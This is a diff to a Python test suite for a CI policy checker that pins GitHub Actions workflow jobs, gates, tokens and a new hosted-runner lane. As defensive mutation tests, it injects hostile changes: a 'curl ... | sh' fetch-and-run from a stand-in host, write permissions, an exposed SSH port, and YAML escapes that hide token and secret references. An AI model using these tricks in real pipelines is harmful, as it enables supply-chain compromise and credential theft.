@@ -111,7 +111,7 @@ class RunnerPolicyTest(unittest.TestCase):
         # ELZ-057: the backend fork-PR gate is now part of the check-fast if: line.
         self.change(
             "symbolic-check.yml",
-            "    if: ${{ (github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository) || (github.event_name == 'workflow_dispatch' && inputs.tier == 'fast') }}",
+            "    if: ${{ vars.ELZOO_CI_LANE != 'hosted' && ((github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository) || (github.event_name == 'workflow_dispatch' && inputs.tier == 'fast')) }}",
             "    if: ${{ true }}",
         )
         self.check(1)
@@ -119,7 +119,7 @@ class RunnerPolicyTest(unittest.TestCase):
     def test_gleam_fork_pr_job_gate_cannot_be_removed(self):
         self.change(
             "symbolic-gleam.yml",
-            "    if: ${{ github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository }}",
+            "    if: ${{ vars.ELZOO_CI_LANE != 'hosted' && (github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository) }}",
             "    if: ${{ true }}",
         )
         self.check(1)
@@ -138,11 +138,11 @@ class RunnerPolicyTest(unittest.TestCase):
 
     def test_extra_backend_job_header_rejected_independently(self):
         self.add_job_header_without_selector("symbolic-check.yml")
-        self.assertIn("exactly the jobs check-fast, check-any are required", self.check(1).stderr)
+        self.assertIn("exactly the jobs check-fast, check-any, check-hosted are required", self.check(1).stderr)
 
     def test_extra_gleam_job_header_rejected_independently(self):
         self.add_job_header_without_selector("symbolic-gleam.yml")
-        self.assertIn("exactly one gleam job is required", self.check(1).stderr)
+        self.assertIn("exactly the jobs gleam, gleam-hosted are required", self.check(1).stderr)
 
     def add_ungated_job(self, filename):
         path = self.root / ".github" / "workflows" / filename
@@ -528,13 +528,13 @@ class RunnerPolicyTest(unittest.TestCase):
         source = (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()
         path = self.root / ".github" / "workflows" / "symbolic-check.yml"
         path.write_text(source.replace("  check-fast:\n", "  TMPNAME:\n").replace("  check-any:\n", "  check-fast:\n").replace("  TMPNAME:\n", "  check-any:\n"))
-        self.assertIn("exactly the jobs check-fast, check-any are required, in this order", self.check(1).stderr)
+        self.assertIn("exactly the jobs check-fast, check-any, check-hosted are required, in this order", self.check(1).stderr)
 
     def test_backend_workflow_with_one_job_rejected(self):
         path = self.root / ".github" / "workflows" / "symbolic-check.yml"
         source = path.read_text()
         path.write_text(source[:source.index("\n  check-any:\n")] + "\n")
-        self.assertIn("exactly the jobs check-fast, check-any are required", self.check(1).stderr)
+        self.assertIn("exactly the jobs check-fast, check-any, check-hosted are required", self.check(1).stderr)
 
     def test_if_lines_cannot_be_swapped_between_jobs(self):
         # Swapping the two if: lines would send pull requests to check-any (any backend runner).
@@ -557,8 +557,8 @@ class RunnerPolicyTest(unittest.TestCase):
 
     def test_gleam_setup_step_present_and_pinned(self):
         source = (self.root / ".github" / "workflows" / "symbolic-gleam.yml").read_text()
-        self.assertEqual(1, source.count(self.GLEAM_STEP))
-        self.assertEqual(1, source.count("github.token"))
+        self.assertEqual(2, source.count(self.GLEAM_STEP))  # self-hosted and hosted job
+        self.assertEqual(2, source.count("github.token"))
         self.check(0)
 
     def test_gleam_setup_step_reverted_to_plain_run_rejected(self):
@@ -649,10 +649,10 @@ class RunnerPolicyTest(unittest.TestCase):
 
     def test_decision_step_and_permissions_present_and_pinned(self):
         source = self.source()
-        self.assertEqual(2, source.count(self.DECISION))
-        self.assertEqual(1, source.count(self.ANY_PERMS))
-        self.assertEqual(2, source.count("github.token"))
-        self.assertEqual(2, source.count("permissions:"))  # top level and check-any only
+        self.assertEqual(3, source.count(self.DECISION))
+        self.assertEqual(2, source.count(self.ANY_PERMS))  # check-any and check-hosted
+        self.assertEqual(6, source.count("github.token"))  # three decision steps and three S3 test server steps
+        self.assertEqual(3, source.count("permissions:"))  # top level, check-any and check-hosted only
         self.check(0)
 
     def test_actions_read_only_on_check_any(self):
@@ -773,7 +773,7 @@ class RunnerPolicyTest(unittest.TestCase):
 """
 
     def test_checkout_must_not_persist_the_token(self):
-        self.assertEqual(2, self.source().count(self.CHECKOUT))
+        self.assertEqual(3, self.source().count(self.CHECKOUT))
         for new in (self.CHECKOUT.replace("          persist-credentials: false\n", ""),
                     self.CHECKOUT.replace("persist-credentials: false", "persist-credentials: true"),
                     self.CHECKOUT.replace("fetch-depth: 0", "fetch-depth: 1"),
@@ -814,16 +814,235 @@ class RunnerPolicyTest(unittest.TestCase):
         # The decision script itself refuses everything but a push to main; the workflow must not let
         # the pull request job grant more than contents: read, whatever its steps do.
         source = self.source()
-        self.assertEqual(1, source.count("actions: read"))
+        self.assertEqual(2, source.count("actions: read"))  # check-any and check-hosted
         fast = source[:source.index("  check-any:\n")]
         self.assertNotIn("actions:", fast)
         self.assertNotIn("write", fast)
 
     def test_skip_and_decision_scripts_exist_and_run_in_the_job(self):
         source = self.source()
-        self.assertEqual(2, source.count("      - run: python3 scripts/test-ci-skip.py\n"))
+        self.assertEqual(3, source.count("      - run: python3 scripts/test-ci-skip.py\n"))
         for name in ("ci-skip-decision.py", "test-ci-skip.py"):
             self.assertTrue((ROOT / "scripts" / name).is_file())
+
+    # ELZ-066: the hosted lane. A repository variable picks the lane; the hosted jobs are pinned
+    # by their exact header, run on one label and have no job container.
+    def change_in_job(self, filename, job, old, new):
+        path = self.root / ".github" / "workflows" / filename
+        source = path.read_text()
+        start = source.index(f"\n  {job}:\n") + 1
+        following = [i for i in (source.find("\n  check-", start + 1), source.find("\n  gleam", start + 1)) if i != -1]
+        end = min(following) + 1 if following else len(source)
+        block = source[start:end]
+        self.assertIn(old, block)
+        path.write_text(source[:start] + block.replace(old, new, 1) + source[end:])
+
+    HOSTED_JOBS = (("symbolic-check.yml", "check-hosted"), ("symbolic-gleam.yml", "gleam-hosted"))
+
+    def test_hosted_label_must_be_exactly_ubuntu_24_04(self):
+        for filename, job in self.HOSTED_JOBS:
+            for label in ("ubuntu-latest", "ubuntu-22.04", "ubuntu-24.04-arm", "ubuntu-24.04-8core",
+                          "[self-hosted, ubuntu-24.04]", "[ubuntu-24.04]", "macos-latest", "windows-latest",
+                          "${{ vars.ELZOO_CI_LABEL }}"):
+                with self.subTest(job=job, label=label):
+                    self.change_in_job(filename, job, "runs-on: ubuntu-24.04", f"runs-on: {label}")
+                    self.assertIn("every job must use runs-on: ubuntu-24.04", self.check(1).stderr)
+                    self.tearDown()
+                    self.setUp()
+
+    def test_hosted_job_must_not_gain_a_job_container(self):
+        for filename, job in self.HOSTED_JOBS:
+            with self.subTest(job=job):
+                self.change_in_job(filename, job, "    steps:\n", "    container:\n      image: " + IMAGE + "\n    steps:\n")
+                self.assertTrue(self.check(1).stderr)
+                self.tearDown()
+                self.setUp()
+
+    def test_hosted_job_header_is_pinned(self):
+        for filename, job, old, new in (
+                ("symbolic-check.yml", "check-hosted", "timeout-minutes: 120", "timeout-minutes: 360"),
+                ("symbolic-check.yml", "check-hosted", "      actions: read\n", "      actions: write\n"),
+                ("symbolic-check.yml", "check-hosted", "      contents: read\n", "      contents: write\n"),
+                ("symbolic-check.yml", "check-hosted", "ERL_FLAGS: '+S 4:4 +SDcpu 1 +SDio 1'", "ERL_FLAGS: '+S 8:8'"),
+                ("symbolic-check.yml", "check-hosted", "postgres:16-bookworm@sha256:5264710be20f409750ac6dc4e5706dcef929c87e241605463f0f9aefa932a8d9", "postgres:16-bookworm"),
+                ("symbolic-check.yml", "check-hosted", "          - 5432:5432\n", "          - 5432:5432\n          - 22:22\n"),
+                ("symbolic-check.yml", "check-hosted", "    services:\n", "    outputs:\n      x: y\n    services:\n"),
+                ("symbolic-gleam.yml", "gleam-hosted", "timeout-minutes: 30", "timeout-minutes: 360"),
+                ("symbolic-gleam.yml", "gleam-hosted", "working-directory: spikes/gleam_ui", "working-directory: ."),
+                ("symbolic-gleam.yml", "gleam-hosted", "    steps:\n", "    permissions:\n      contents: write\n    steps:\n")):
+            with self.subTest(job=job, new=new.strip()[:40]):
+                self.change_in_job(filename, job, old, new)
+                self.assertTrue(self.check(1).stderr)
+                self.tearDown()
+                self.setUp()
+
+    def test_hosted_identity_gate_cannot_change(self):
+        for filename, job in self.HOSTED_JOBS:
+            for old, new in (('test "$RUNNER_ENVIRONMENT" = github-hosted', 'test "$RUNNER_ENVIRONMENT" = self-hosted'),
+                             ('test "$RUNNER_OS" = Linux\n          ', ''),
+                             ('test "$VERSION_ID" = 24.04', 'test "$VERSION_ID" = 22.04'),
+                             ("Verify the GitHub-hosted runner", "Verify runner")):
+                with self.subTest(job=job, old=old[:30]):
+                    self.change_in_job(filename, job, old, new)
+                    self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)
+                    self.tearDown()
+                    self.setUp()
+
+    def test_hosted_gate_step_cannot_be_conditional(self):
+        self.change_in_job("symbolic-check.yml", "check-hosted", "      - name: Verify the GitHub-hosted runner\n",
+                           "      - name: Verify the GitHub-hosted runner\n        if: ${{ false }}\n")
+        self.assertTrue(self.check(1).stderr)
+
+    def test_lane_condition_is_pinned_in_every_job(self):
+        for filename, job, old, new in (
+                ("symbolic-check.yml", "check-fast", "vars.ELZOO_CI_LANE != 'hosted' && ", ""),
+                ("symbolic-check.yml", "check-any", "vars.ELZOO_CI_LANE != 'hosted' && ", ""),
+                ("symbolic-gleam.yml", "gleam", "vars.ELZOO_CI_LANE != 'hosted' && ", ""),
+                ("symbolic-check.yml", "check-hosted", "vars.ELZOO_CI_LANE == 'hosted' && ", ""),
+                ("symbolic-gleam.yml", "gleam-hosted", "vars.ELZOO_CI_LANE == 'hosted' && ", ""),
+                ("symbolic-check.yml", "check-hosted", "vars.ELZOO_CI_LANE == 'hosted'", "vars.ELZOO_CI_LANE != 'self'"),
+                ("symbolic-check.yml", "check-fast", "vars.ELZOO_CI_LANE != 'hosted'", "vars.ELZOO_CI_LANE != 'self'"),
+                ("symbolic-check.yml", "check-hosted", "(github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository)", "github.event_name == 'pull_request'"),
+                ("symbolic-gleam.yml", "gleam-hosted", "github.event.pull_request.head.repo.full_name == github.repository", "true")):
+            with self.subTest(job=job, old=old[:40], new=new[:30]):
+                self.change_in_job(filename, job, old, new)
+                self.assertIn("same-repository PR job gate is missing or changed", self.check(1).stderr)
+                self.tearDown()
+                self.setUp()
+
+    def test_lane_variable_cannot_leave_the_job_gates(self):
+        # A step that reads the variable could change behaviour per lane; only the five job gates may.
+        for filename, job, old in (("symbolic-check.yml", "check-hosted", "      - run: python3 scripts/check-claims.py\n"),
+                                   ("symbolic-check.yml", "check-fast", "      - run: python3 scripts/check-claims.py\n"),
+                                   ("symbolic-gleam.yml", "gleam-hosted", "      - run: ./scripts/check.sh\n")):
+            with self.subTest(job=job):
+                self.change_in_job(filename, job, old,
+                                   old + "      - name: Lane\n        env:\n          LANE: ${{ vars.ELZOO_CI_LANE }}\n        run: true\n")
+                self.assertIn("may appear only in the job-level if: lines", self.check(1).stderr)
+                self.tearDown()
+                self.setUp()
+
+    def test_hosted_jobs_are_required(self):
+        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
+        source = path.read_text()
+        path.write_text(source[:source.index("\n  check-hosted:\n")] + "\n")
+        self.assertIn("exactly the jobs check-fast, check-any, check-hosted are required", self.check(1).stderr)
+        self.tearDown()
+        self.setUp()
+        path = self.root / ".github" / "workflows" / "symbolic-gleam.yml"
+        source = path.read_text()
+        path.write_text(source[:source.index("\n  gleam-hosted:\n")] + "\n")
+        self.assertIn("exactly the jobs gleam, gleam-hosted are required", self.check(1).stderr)
+
+    def test_hosted_backend_token_is_limited_to_the_pinned_steps(self):
+        self.change_in_job("symbolic-check.yml", "check-hosted", "          ELZOO_CHECK_EVENT: ${{ github.event_name }}\n",
+                           "          ELZOO_CHECK_EVENT: ${{ github.event_name }}\n          GITHUB_TOKEN: ${{ github.token }}\n")
+        self.assertIn("github.token and secrets are not allowed", self.check(1).stderr)
+
+    def test_hosted_backend_job_keeps_the_decision_step_and_skip_conditions(self):
+        self.change_in_job("symbolic-check.yml", "check-hosted", "      - run: mix setup\n        if: ${{ steps.skip.outputs.skip != 'true' }}\n",
+                           "      - run: mix setup\n")
+        self.assertIn("step-level conditions are not the reviewed ones", self.check(1).stderr)
+        self.tearDown()
+        self.setUp()
+        self.change_in_job("symbolic-check.yml", "check-hosted", "          persist-credentials: false\n", "")
+        self.assertIn("the pinned checkout step (persist-credentials: false) is missing or changed (check-hosted)", self.check(1).stderr)
+
+    # ELZ-064: the disposable S3 test server steps are pinned in all three backend jobs.
+    def test_s3_test_server_steps_are_pinned(self):
+        for job in ("check-fast", "check-any", "check-hosted"):
+            for old, new in (("        run: python3 scripts/ci-minio.py\n", "        run: curl -fsSL https://example.invalid/x | sh\n"),
+                             ("        id: minio\n", "        id: other\n"),
+                             ("          GITHUB_TOKEN: ${{ github.token }}\n        run: python3 scripts/ci-minio.py\n",
+                              "        run: python3 scripts/ci-minio.py\n"),
+                             ("        run: python3 scripts/ci-minio.py\n", "        run: python3 scripts/ci-minio.py\n        working-directory: /tmp\n"),
+                             ("elzoo-minio-RELEASE.2025-09-07T16-13-09Z-", "elzoo-minio-RELEASE.2025-09-07T16-13-10Z-"),
+                             ("      - name: Restore the pinned S3 test server binary\n", "      - name: Restore binary\n"),
+                             ("steps.skip.outputs.skip != 'true' && steps.minio.outputs.source != 'cache'", "always()"),
+                             ("      - name: Start the disposable S3 test server\n        if: ${{ steps.skip.outputs.skip != 'true' }}\n",
+                              "      - name: Start the disposable S3 test server\n")):
+                with self.subTest(job=job, new=new.strip()[:50]):
+                    self.change_in_job("symbolic-check.yml", job, old, new)
+                    self.assertTrue(self.check(1).stderr)
+                    self.tearDown()
+                    self.setUp()
+
+    def test_s3_test_server_steps_cannot_be_removed(self):
+        for job in ("check-fast", "check-hosted"):
+            with self.subTest(job=job):
+                path = self.root / ".github" / "workflows" / "symbolic-check.yml"
+                source = path.read_text()
+                start = source.index(f"\n  {job}:\n")
+                first = source.index("      - name: Restore the pinned S3 test server binary\n", start)
+                last = source.index("      - uses: erlef/setup-beam", first)
+                path.write_text(source[:first] + source[last:])
+                self.assertIn("the pinned S3 test server steps are missing or changed", self.check(1).stderr)
+                self.tearDown()
+                self.setUp()
+
+    def test_hosted_gleam_setup_step_is_pinned_per_job(self):
+        self.change_in_job("symbolic-gleam.yml", "gleam-hosted", self.GLEAM_STEP, "      - run: ./scripts/setup.sh\n")
+        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
+        self.tearDown()
+        self.setUp()
+        self.change_in_job("symbolic-gleam.yml", "gleam-hosted", "        run: ./scripts/setup.sh\n",
+                           "        run: ./scripts/setup.sh\n        if: ${{ false }}\n")
+        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
+
+    # ELZ-066 review findings: the lane variable in any spelling, and keys after the hosted steps list.
+    def test_lane_variable_in_any_case_or_script_text_rejected(self):
+        for filename, job, old in (("symbolic-check.yml", "check-hosted", "      - run: python3 scripts/check-claims.py\n"),
+                                   ("symbolic-gleam.yml", "gleam-hosted", "      - run: ./scripts/check.sh\n")):
+            for line in ("        env:\n          LANE: ${{ Vars.elzoo_ci_lane }}\n        run: true\n",
+                         "        run: |\n          echo \"${{ vars.ELZOO_CI_LANE }}\"\n",
+                         "        run: |\n          echo '${{ toJSON(vars) }}'\n",
+                         "        run: |\n          echo '${{ toJson(VARS) }}'\n"):
+                with self.subTest(job=job, line=line.strip()[:40]):
+                    self.change_in_job(filename, job, old, old + "      - name: Lane\n" + line)
+                    self.assertIn("may appear only in the job-level if: lines", self.check(1).stderr)
+                    self.tearDown()
+                    self.setUp()
+
+    def test_hosted_job_must_end_with_its_steps_list(self):
+        for filename, job in self.HOSTED_JOBS:
+            for extra in ("    environment: production\n", "    continue-on-error: true\n",
+                          "    strategy:\n      matrix:\n        x: [1]\n",
+                          "    services:\n      other:\n        image: " + IMAGE + "\n"):
+                with self.subTest(job=job, extra=extra.strip()[:30]):
+                    path = self.root / ".github" / "workflows" / filename
+                    source = path.read_text()
+                    start = source.index(f"\n  {job}:\n")
+                    following = source.find("\n  gleam", start + 1) if job != "gleam-hosted" else -1
+                    end = following if following != -1 else len(source)
+                    path.write_text(source[:end].rstrip("\n") + "\n" + extra + source[end:])
+                    self.assertTrue(self.check(1).stderr)
+                    self.tearDown()
+                    self.setUp()
+
+    def test_hosted_gleam_checkout_and_steps_are_pinned(self):
+        for old, new in (("          persist-credentials: false\n", "          persist-credentials: true\n"),
+                         ("          persist-credentials: false\n", "          persist-credentials: false\n          ref: main\n"),
+                         ("      - run: ./scripts/check.sh\n", "      - run: ./scripts/check.sh\n        if: ${{ false }}\n"),
+                         ("      - run: ./scripts/check.sh\n", "      - run: ./scripts/check.sh\n        continue-on-error: true\n"),
+                         ("      - run: ./scripts/check.sh\n", "      - run: ./scripts/check.sh\n        shell: bash {0}\n")):
+            with self.subTest(new=new.strip()[:40]):
+                self.change_in_job("symbolic-gleam.yml", "gleam-hosted", old, new)
+                self.assertTrue(self.check(1).stderr)
+                self.tearDown()
+                self.setUp()
+
+    # ELZ-066 second review pass: YAML escapes decode before GitHub evaluates ${{ }}.
+    def test_yaml_escapes_cannot_hide_the_token_secrets_or_lane_variable(self):
+        for filename, job, old in (("symbolic-check.yml", "check-hosted", "      - run: python3 scripts/check-claims.py\n"),
+                                   ("symbolic-check.yml", "check-fast", "      - run: python3 scripts/check-claims.py\n"),
+                                   ("symbolic-gleam.yml", "gleam-hosted", "      - run: ./scripts/check.sh\n")):
+            for value in ('"${{ github.t\\x6fken }}"', '"${{ github.t\\u006fken }}"', '"${{ s\\x65crets.X }}"',
+                          '"${{ v\\x61rs.\\x45LZOO_CI_LANE }}"'):
+                with self.subTest(job=job, value=value):
+                    self.change_in_job(filename, job, old, old + "      - name: Escaped\n        env:\n          T: " + value + "\n        run: true\n")
+                    self.assertIn("escapes in double-quoted scalars", self.check(1).stderr)
+                    self.tearDown()
+                    self.setUp()
 
 
 if __name__ == "__main__":
